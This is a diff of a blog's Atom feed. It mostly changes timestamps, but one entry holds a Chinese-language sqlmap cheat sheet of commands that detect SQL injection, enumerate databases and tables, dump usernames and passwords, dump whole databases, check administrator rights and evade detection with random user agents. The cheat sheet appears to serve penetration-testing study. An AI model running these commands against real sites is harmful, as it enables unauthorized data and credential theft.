@@ -6,7 +6,7 @@
   <link href="http://eriseda.com/atom.xml" rel="self"/>
   
   <link href="http://eriseda.com/"/>
-  <updated>2021-11-10T11:34:18.043Z</updated>
+  <updated>2021-11-10T12:36:42.179Z</updated>
   <id>http://eriseda.com/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://eriseda.com/posts/3cc49a3.html"/>
     <id>http://eriseda.com/posts/3cc49a3.html</id>
     <published>2021-11-10T08:00:00.000Z</published>
-    <updated>2021-11-10T11:34:18.043Z</updated>
+    <updated>2021-11-10T12:36:42.179Z</updated>
     
     
     
@@ -38,7 +38,7 @@
     <link href="http://eriseda.com/posts/f1840eab.html"/>
     <id>http://eriseda.com/posts/f1840eab.html</id>
     <published>2021-11-01T08:00:00.000Z</published>
-    <updated>2021-11-10T12:36:07.801Z</updated>
+    <updated>2021-11-10T12:36:42.176Z</updated>
     
     <content type="html"><![CDATA[<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">(1)python sqlmap.py-u“url” #检测目标网站是否存在注入(2)python sqlmap.py-u“url”--dbs #获取对方数据库所有库的名称(3)python sqlmap.py-u “url” -D “security"--tables #获取security库下的表(4)python sqlmap.py-u “url” -D “securtiy"-T “emails,users" --columns #获取eamil表，users表中的字段(5)python sqlmap.py -u“url” -D“securtiy"-T “uses" -C“id,username,password” --dump#导出数据指定数据(6)python sqlmap.py-u“url”--dump-all#拖库(7)python sqlmap.py-u"url"--current-user #获取当前用户名称(8)python sqlmap.py -u “url” --current-db#获取当前使用的数据名称(9)python sqlmap-r 1.txt #指定文件检测注入(10)python sqlmap-u“url”--dbms“mysql”#指定数据库类型进行检测(11)python sqlmap-r 1.txt-p“参数名”#post型注入，-p指定哪个参数注入(12)python sqlmap -u“url”--forms#自动搜索表单 并测试注入(13)python sqlmap-u“url”-dbs-v4#显示sqlmap注入的信息有七个等级默认是一 0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。(默认)2、同时显示debug信息。3、同时显示注入的payload4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面(14)python sqlmap-U“url”--tamper unmagicquotes#检测宽字节注入(15)python sqlmap-u“url”-is-dba #判断当前用户是否为数据库管理员权限(16)python sqlmap -u“url”--random-agent #随机UA头(17)探测等级参数：-level共有五个等级，默认为1级..这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTPUser-Agent/Referer头在level为3的时候就会测试。总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。python sqlmap.py -u“url”--cookie "cookie value"--level 2(18)风险等级参数：-risk共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。(19)python sqlmap.py-u“url”--users#列数据库用户(20)python sqlmap.py-u“url”-batch #采用默认配置对提示进行设置(21)python sqlmap.py-u"url"-roles 或者--privileges #列用户以及权限(22)伪静态注入：使用sqlmap进行伪静态注入python sqlmap -u"www.xx.com/index.php/news/id/203*.html"python sqlmap -u"www.xx.com/index.php/news/id/10*"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
     
